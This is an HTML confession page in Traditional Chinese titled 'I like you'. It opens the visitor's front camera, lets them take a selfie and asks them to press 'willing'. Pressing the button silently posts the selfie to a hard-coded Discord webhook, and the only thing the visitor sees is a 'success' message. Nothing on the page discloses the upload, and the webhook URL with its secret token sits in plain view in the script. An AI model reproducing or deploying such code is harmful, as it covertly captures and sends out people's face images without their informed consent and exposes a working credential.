<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>我喜歡妳 💖</title>

<style>
body {
  margin: 0;
  background: #0d1117;
  font-family: "微軟正黑體";
  color: white;
  text-align: center;
  overflow: hidden;
  touch-action: none;
}

h2 {
  margin-top: 20px;
}

video {
  width: 90%;
  max-width: 320px;
  border-radius: 12px;
  margin-top: 10px;
}

canvas {
  display: none;
}

button {
  margin: 10px;
  padding: 12px 20px;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  cursor: pointer;
}

#shoot {
  background: #4CAF50;
  color: white;
}

#yesBtn {
  background: #ff4d6d;
  color: white;
}

img {
  width: 200px;
  margin-top: 10px;
  border-radius: 12px;
  display: none;
}
</style>
</head>

<body>

<h2>💖 拍照決定要不要答應 💖</h2>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<br>

<button id="shoot">📸 拍照</button>
<button id="yesBtn">💖 願意</button>

<br>

<img id="preview">

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const shoot = document.getElementById("shoot");
const yesBtn = document.getElementById("yesBtn");
const preview = document.getElementById("preview");

let imageData = null;

// 📷 開前置鏡頭
navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" }
}).then(stream => {
  video.srcObject = stream;
});

// 📸 拍照
shoot.onclick = () => {
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  imageData = canvas.toDataURL("image/png");

  preview.src = imageData;
  preview.style.display = "block";
};

// 💖 點願意 → 傳 Discord
yesBtn.onclick = async () => {

  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";

  if (!imageData) return;

  const res = await fetch(imageData);
  const blob = await res.blob();

  const formData = new FormData();
  formData.append("file", blob, "love.png");

  const embed = {
    username: "💌 告白系統",
    embeds: [
      {
        title: "💖 告白成功",
        description: "有人按下願意 ❤️",
        color: 0xff4d6d,
        image: {
          url: "attachment://love.png"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  formData.append("payload_json", JSON.stringify(embed));

  await fetch(webhookURL, {
    method: "POST",
    body: formData
  });

  document.body.innerHTML = "<h1>💖 成功 💖</h1>";
};
</script>

</body>
</html>
